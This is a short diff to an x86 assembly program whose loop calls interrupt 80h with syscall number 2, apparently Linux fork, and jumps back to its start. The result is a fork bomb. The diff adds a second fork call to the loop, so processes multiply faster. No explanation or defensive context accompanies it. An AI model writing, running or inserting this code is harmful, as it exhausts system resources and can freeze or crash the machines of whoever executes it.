@@ -3,5 +3,7 @@ global _start
 _start:
 mov ax, 2
 int 80h
+mov ax, 2
+int 80h
 jmp _start
 section .data
